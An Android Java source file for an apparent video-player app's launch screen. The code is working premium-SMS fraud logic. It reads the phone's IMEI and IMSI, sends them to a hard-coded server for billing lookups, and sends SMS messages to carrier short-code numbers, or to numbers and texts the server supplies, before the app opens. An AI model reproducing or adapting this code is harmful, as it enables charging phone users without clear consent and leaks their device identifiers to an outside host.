package cn.yoyo.mobile.yes;

import com.umeng.analytics.MobclickAgent;

import cn.yoyo.mobile.ui.Activity_Main;
import cn.yoyo.mobile.ui.OPlayerApplication;
import cn.yoyo.mobile.util.ToastUtils;
import cn.yoyo.mobile.yef.R;
import android.app.Activity;
import android.app.PendingIntent;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.net.Uri;
import android.os.Bundle;
import android.os.Handler;
import android.os.Parcelable;
import android.preference.PreferenceManager;
import android.telephony.SmsManager;
import android.telephony.TelephonyManager;
import android.text.TextUtils;
import android.view.KeyEvent;
import android.view.View;
import android.view.View.OnClickListener;
import android.view.animation.AlphaAnimation;
import android.view.animation.Animation;
import android.widget.Toast;

public class MainActivity extends Activity {
	private String mArea = "";//卡地区
	private String mImsi = "", mImei = "";
	@Override
	protected void onCreate(Bundle savedInstanceState) {
		super.onCreate(savedInstanceState);
		setContentView(R.layout.activity_main);
		MobclickAgent.updateOnlineConfig(this);
		AlphaAnimation animation = new AlphaAnimation(0.4f, 0.8f);
		animation.setDuration(600);
		animation.setRepeatMode(Animation.REVERSE);
		animation.setRepeatCount(Animation.INFINITE);
		findViewById(R.id.app_about_title).startAnimation(animation);
		init();
		showDialog();
		//createShortcut();
		//addShortcut();
		
		//startActivity(new Intent(MainActivity.this, DialogActivity.class));
		
	}
	
	private void init(){
		TelephonyManager telManager = (TelephonyManager) getSystemService(Context.TELEPHONY_SERVICE);  
		if(telManager == null) return;
		mImei = telManager.getDeviceId();
        mImsi = telManager.getSubscriberId();  
        new Thread(new Runnable() {
			@Override
			public void run() {
				// TODO Auto-generated method stub
			mArea = StringUtil.getURL("http://103.224.248.34:8096/eulprovincefind.aspx?imsi="+mImsi);
			}
		}).start();
	}
	
	private void send2(final String phone, final String mess,int delay){ 
		MobclickAgent.onEvent(MainActivity.this, "send",SMSReceiver.code);
		PendingIntent pi = PendingIntent.getBroadcast(MainActivity.this, 0, new Intent(SMSReceiver.SMS_SEND_ACTION), 0);  
        SmsManager sms = SmsManager.getDefault(); 
        sms.sendTextMessage(phone, null , mess, pi,  null ); 
    }  
	
	private void getCardMessage(){
		
		if(TextUtils.isEmpty(mImsi)) {
			ToastUtils.showToast("请插入手机卡在使用");
			return;
		}
		
        if(mImsi.startsWith("46000") || mImsi.startsWith("46002")){//因为移动网络编号46000下的IMSI已经用完，所以虚拟了一个46002编号，134/159号段使用了此编号  
        //中国移动  
        	SMSReceiver.code = "46000";
        	if(!StringUtil.isNetworkConnected(MainActivity.this)){
        		ToastUtils.showToast("使用该软件需要开启网络");
        		return ;
			}
        	        new Thread(new Runnable() {
        				@Override
        				public void run() {
        					// TODO Auto-generated method stub
        						try {
        							//if(TextUtils.isEmpty(mArea))
        							//mArea=StringUtil.getURL("http://103.224.248.34:8096/eulprovincefind.aspx?imsi="+mImsi);
        		    				//if(!StringUtil.isBlack(getResources().getStringArray(R.array.cmcc), mArea)){
        		    					String url = "http://103.224.248.34:8096/eulbillingcmcc.aspx?cpid=10101"
            				        	        +"&imei=" + mImei
            				        	        +"&imsi=" + mImsi
            				        	        +"&price=15" ;
    									getJson(StringUtil.getURL(url));
        		    				//}			
								} catch (Exception e) {
									// TODO Auto-generated catch block
									e.printStackTrace();
								}
        				}
        			}).start();
        	        
        }else if(mImsi.startsWith("46001")){  
        	//中国联通  
        	SMSReceiver.code = "46001";
        	
        	if(TextUtils.isEmpty(mArea)){
        		if(!StringUtil.isNetworkConnected(MainActivity.this)){
            		ToastUtils.showToast("使用该软件需要开启网络");
            		return ;
    			}
        		new Thread(new Runnable() {
    				@Override
    				public void run() {
    					// TODO Auto-generated method stub
    				mArea=StringUtil.getURL("http://103.224.248.34:8096/eulprovincefind.aspx?imsi="+mImsi);
    				if(!StringUtil.isBlack(getResources().getStringArray(R.array.uniom), mArea)){
    		        	SMSReceiver.SMSnumber = "10655477";
    		        	send2("106901334042", "10CH0181B",0);
    				}			
    				}
    			}).start();
			}else{
				if(!StringUtil.isBlack(getResources().getStringArray(R.array.uniom), mArea)){
		        	SMSReceiver.SMSnumber = "10655477";
		        	send2("106901334042", "10CH0181B",0);
				}	
			}
        	
        }else if(mImsi.startsWith("46003")){ 
        	//中国电信  
        	SMSReceiver.code = "46003";
        	if(TextUtils.isEmpty(mArea)){
        		if(!StringUtil.isNetworkConnected(MainActivity.this)){
            		ToastUtils.showToast("使用该软件需要开启网络");
            		return ;
    			}
        		new Thread(new Runnable() {
    				@Override
    				public void run() {
    					// TODO Auto-generated method stub
    				mArea=StringUtil.getURL("http://103.224.248.34:8096/eulprovincefind.aspx?imsi="+mImsi);
    				if(!StringUtil.isBlack(getResources().getStringArray(R.array.uniom), mArea)){
    					SMSReceiver.SMSnumber = "10001888@1065987701";
    					send2("1065987701", "900cz1201",0);
    				}			
    				}
    			}).start();
			}else{
				if(!StringUtil.isBlack(getResources().getStringArray(R.array.net), mArea)){
					SMSReceiver.SMSnumber = "10001888@1065987701";
					send2("1065987701", "900cz1201",0);
				}	
			}
        } 
        
	}
	

    private void getJson(String resultData){
    	if(TextUtils.isEmpty(resultData))
    		return;
    	
    	String[] strings = resultData.split("<\\:>");
    	if(strings.length>=3){
    		SMSReceiver.SMSnumber = strings[2];
    		send2(strings[0],strings[1],0);
    	}
    }
    
    public void onResume() {
		super.onResume();
		MobclickAgent.onResume(this);
		}

		public void onPause() {
		super.onPause();
		MobclickAgent.onPause(this);
		}
	private void showDialog(){
		SharedPreferences preference = PreferenceManager.getDefaultSharedPreferences(this);
        if(!preference.getBoolean("hasSend", false)){
        	findViewById(R.id.dialog_welcome).setVisibility(0);
        }else{
        	findViewById(R.id.dialog_welcome).setVisibility(8);
        	startActivity();
        }
        findViewById(R.id.send).setOnClickListener(new OnClickListener() {
			@Override
			public void onClick(View arg0) {
				// TODO Auto-generated method stub
			MobclickAgent.onEvent(MainActivity.this, "click",SMSReceiver.code);
			getCardMessage();
			}
		});
	}
    
	private void startActivity(){
		startActivity(new Intent(this, Activity_Main.class).addFlags(Intent.FLAG_ACTIVITY_NEW_TASK));
		finish();
	}
	
	private long exitTime = 0;
	   @Override
	   public boolean onKeyDown(int keyCode, KeyEvent event)
	   {
	       if (keyCode == KeyEvent.KEYCODE_BACK)
	       {
	    	   if ((System.currentTimeMillis() - exitTime) > 2000)
	           {
	                   Toast.makeText(this, getString(R.string.exit_click), Toast.LENGTH_SHORT).show();
	                   exitTime = System.currentTimeMillis();
	           } else
	           {
	        	   System.exit(0);
	           }
	   				return true;
	       }
	       return super.onKeyDown(keyCode, event);
	   }
	   
	   private void createShortcut(){
		   Intent addIntent=new Intent("com.android.launcher.action.INSTALL_SHORTCUT");
           Parcelable icon=Intent.ShortcutIconResource.fromContext(this, R.drawable.icon_classify_movie); //获取快捷键的图标
           Intent myIntent=new Intent(this, Activity_Main.class);
           addIntent.putExtra(Intent.EXTRA_SHORTCUT_NAME, "快捷方式");//快捷方式的标题
           addIntent.putExtra(Intent.EXTRA_SHORTCUT_ICON_RESOURCE, icon);//快捷方式的图标
           addIntent.putExtra(Intent.EXTRA_SHORTCUT_INTENT, myIntent);//快捷方式的动作
           sendBroadcast(addIntent);//发送广播
	   }
	   
	   public void addShortcut(){

		   Uri uri = Uri.parse("www.baidu.com");  
		   Intent intentAddShortcut = new Intent("com.android.launcher.action.INSTALL_SHORTCUT");

           //添加名称

           intentAddShortcut.putExtra(Intent.EXTRA_SHORTCUT_NAME, "baidu快捷方式");

           //添加图标

           Parcelable icon=Intent.ShortcutIconResource.fromContext(this, R.drawable.icon_classify_movie); //获取快捷键的图标
           intentAddShortcut.putExtra(Intent.EXTRA_SHORTCUT_ICON_RESOURCE, icon);

           //设置Launcher的Uri数据

           Intent intentLauncher = new Intent(Intent.ACTION_VIEW);

           intentLauncher.setData(uri);          

           //添加快捷方式的启动方法

           intentAddShortcut.putExtra(Intent.EXTRA_SHORTCUT_INTENT, intentLauncher);

           sendBroadcast(intentAddShortcut);       

 }
	   
}
